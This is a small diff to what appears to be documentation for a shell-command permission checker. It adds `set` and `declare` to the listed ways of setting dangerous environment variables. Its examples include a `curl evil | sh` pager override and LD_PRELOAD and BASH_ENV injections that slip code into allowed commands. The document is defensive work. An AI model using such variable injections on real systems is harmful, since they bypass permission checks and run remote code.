@@ -233,6 +233,8 @@ any of these forms:
 - A command prefix: `GIT_PAGER='curl evil | sh' git log`, `LD_PRELOAD=/tmp/x.so node app.js`
 - An `export` argument: `export BASH_ENV=/tmp/x`
 - An `env` argument: `env GIT_EXTERNAL_DIFF=evil git diff`
+- A `set` argument: `set GIT_PAGER=evil`
+- A `declare` argument: `declare GIT_PAGER=evil`
 
 This holds even when the command itself is always-allowed (`git`, `env`): the
 dangerous variable upgrades the decision to `ask`. The prefix is inspected
